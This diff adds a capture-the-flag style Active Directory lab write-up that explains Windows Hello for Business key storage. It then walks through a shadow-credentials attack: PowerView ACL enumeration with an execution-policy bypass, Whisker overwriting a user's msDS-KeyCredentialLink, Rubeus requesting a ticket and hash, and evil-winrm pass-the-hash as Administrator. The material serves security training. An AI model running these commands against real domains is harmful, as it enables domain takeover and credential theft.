@@ -1,0 +1,96 @@
+Active Directory 101
+Forensic McBlueActive Directory (AD) is a system mainly used by businesses in Windows environments. It's a centralised authentication system. The Domain Controller (DC) is at the heart of AD and typically manages data storage, authentication, and authorisation within a domain.
+
+You can think of AD as a digital database containing objects like users, groups, and computers, each with specific attributes and permissions. Ideally, it applies the principle of least privilege and uses a hierarchical approach to managing roles and giving authenticated users access to all non-sensitive data throughout the system. For this reason, assigning permissions to users must be approached cautiously, as it can potentially compromise the entire Active Directory. We'll delve into this in the upcoming exploitation section.
+
+Active Directory
+
+Think Passwords Are Hard To Remember - Say Hello to WHfB
+
+Microsoft introduced Windows Hello for Business (WHfB) as a modern and secure way to replace conventional password-based authentication. Instead of relying on traditional passwords, WHfB utilises cryptographic keys for user verification. Users on the Active Directory domain can access the AD using a PIN or biometrics connected to a pair of cryptographic keys: public and private. Those keys help to prove the identity of the entity to which they belong. The msDS-KeyCredentialLink is an attribute used by the Domain Controller to store the public key in WHfB for enrolling a new user device (such as a computer). In short, each user object in the Active Directory database will have its public key stored in this unique attribute.
+
+Windows Hello for Business
+
+Here's the procedure to store a new pair of certificates with WHfB:
+
+Trusted Platform Module (TPM) public-private key pair generation: The TPM creates a public-private key pair for the user's account when they enrol. It's crucial to remember that the private key never leaves the TPM and is never disclosed.
+Client certificate request: The client initiates a certificate request to receive a trustworthy certificate. The organisation's certificate issuing authority (CA) receives this request and provides a valid certificate.
+Key storage: The user account's msDS-KeyCredentialLink attribute will be set.
+
+Active Direcotry attributes
+Authentication Process:
+
+Authorisation: The Domain Controller decrypts the client's pre-authentication data using the raw public key stored in the msDS-KeyCredentialLink attribute of the user's account.
+Certificate generation: The certificate is created for the user by the Domain Controller and can be sent back to the client.
+Authentication: After that, the client can log in to the Active Directory domain using the certificate.
+
+Authentication Process
+
+
+
+Please note that an attacker capable of overriding the msDS-KeyCredentialLink of a specific vulnerable user can compromise it.
+
+Enumeration
+
+Now is your chance to shine and ensure no security misconfigurations are lurking in the shadows. So, let's get started by dusting off our magnifying glasses (or mouse pointers). Enumerating the Active Directory for the vulnerable permission is the first step to check if the current user has any write capabilities over another user on the AD.
+
+To achieve this, you can use the PowerShell script PowerView with the following command: Find-InterestingDomainAcl
+
+This functionality will list all the abusable privileges. It's then possible to filter for the current user: "hr".
+
+We are specifically looking for any write privilege since the goal is to overwrite the msDS-KeyCredentialLink
+
+From the vulnerable machine, launch PowerShell, which is pinned on your taskbar, and enter the following commands:
+
+
+cd C:\Users\hr\Desktop moves to the folder containing all the exploitation tools.
+powershell -ep bypass will bypass the default policy for arbitrary PowerShell script execution.
+. .\PowerView.ps1 loads the PowerView script into the memory.
+At this point, we can enumerate the privileges by running:
+
+Find-InterestingDomainAcl -ResolveGuids
+
+As you may see, this command will return all users' privileges. Since we are specifically looking for the current user "hr", we need to filter out using:
+
+Where-Object { $_.IdentityReferenceName -eq "hr" }  
+
+We're interested in the current user, the vulnerable user, and the privilege assigned. We can filter that out by running:
+
+Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights
+
+Now, you can launch the full command:
+
+Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights
+
+
+PS C:\Users\hr\Desktop> .\Whisker.exe add /target:vansprinkles
+[*] No path was provided. The certificate will be printed as a Base64 blob
+[*] No pass was provided. The certificate will be stored with the password sr803SUV8xqE0GV7
+[*] Searching for the target account
+[*] Target user found: CN=vansprinkles,CN=Users,DC=AOC,DC=local
+[*] Generating certificate
+[*] Certificate generaged
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID 9ba3c51f-2396-4224-b830-57fd65fe179f
+[*] Updating the msDS-KeyCredentialLink attribute of the target object
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] You can now run Rubeus with the following syntax:
+
+Rubeus.exe asktgt /user:vansprinkles /certificate:MIIJwAIBAzCCCXwGCSqGSIb3DQEHAaCCCW5EaJ8KdskAIN1Wk3Gsi0rTgty0I3go71DZLDINm9JSLPPBvUjdeJ9ojaoCqo5NgYYbC+WoA6ZqXycau47NC2bctnFXv1BPGukNH78N69EjaMkmgUyXlv0PhhIErvD6OqAH+SUgGpNcRYGiskniWSb3qBSQjUhOytwdRQXxvO2sTXI6SDYSs7Rt2LZm+2YJ0e5u72ot+fWQz6JoEbBVRb/bpZMRn4Ji7YUh1igQOPuE/7tkQ+l9rLU+AEGSbe1P2y3ewBU76A3IT658QjSRkYLB3Q49aAZ7QaQ/bRbX4I1f11lgq3u3N2w1zakLjfk4biUVDue6XGnS8duF2WKWoRMRqPdpgOGJnuybJwttaAGVFWTaHfkNNGIu/svHOiSF2WpwkXraWYs/yTrSEWggtvdZ09N2r41niX345sy3/uX67tCJlNgTOe1wXx1tAHY36XBcsDj5R0qD5CkcyhSSj2D5DLUnd4kK6CxD75kQ0jDxEBC{snipped} /password:"sr803SUV8xqE0GV7" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
+
+evil-winrm -i 10.10.201.44 -u Administrator -H F138C405BD9F3139994E22*Evil-WinRM* PS C:\Users\Administratoruser> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       11/22/2023  10:56 AM                chatlog_files
+-a----       11/22/2023  10:29 AM          11620 chatlog.html
+-a----       10/16/2023   7:33 AM             17 flag.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat flag.txt
+
